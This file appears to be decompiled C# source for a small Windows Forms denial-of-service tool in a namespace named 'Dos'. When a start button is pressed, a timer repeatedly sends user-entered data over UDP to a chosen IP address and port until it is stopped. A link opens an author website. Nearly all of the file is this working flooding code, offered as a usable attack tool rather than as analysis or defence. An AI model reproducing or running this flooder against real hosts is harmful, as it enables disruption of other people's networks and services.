using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace Dos
{
	// Token: 0x02000002 RID: 2
	public partial class Form1 : Form
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public Form1()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002068 File Offset: 0x00000268
		private void button1_Click(object sender, EventArgs e)
		{
			this.timer1.Start();
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002077 File Offset: 0x00000277
		private void button2_Click(object sender, EventArgs e)
		{
			this.timer1.Stop();
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002086 File Offset: 0x00000286
		private void timer1_Tick(object sender, EventArgs e)
		{
			this.NetSocketSender();
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002090 File Offset: 0x00000290
		public void NetSocketSender()
		{
			UdpClient udpClient = new UdpClient();
			IPAddress ipaddress = IPAddress.Parse(this.iptxt.Text);
			int num = Convert.ToInt32(this.porttxt.Text);
			IPEndPoint ipendPoint = new IPEndPoint(ipaddress, num);
			try
			{
				udpClient.Connect(ipendPoint);
				byte[] bytes = Encoding.ASCII.GetBytes(this.datatxt.Text);
				udpClient.Send(bytes, bytes.Length);
				udpClient.AllowNatTraversal(true);
				udpClient.DontFragment = true;
			}
			catch
			{
				MessageBox.Show("");
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002130 File Offset: 0x00000330
		private void Form1_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002134 File Offset: 0x00000334
		private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			string text = "https://jun-suzu.net";
			this.OpenUrl(text);
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002150 File Offset: 0x00000350
		private Process OpenUrl(string url)
		{
			return Process.Start(url);
		}
	}
}
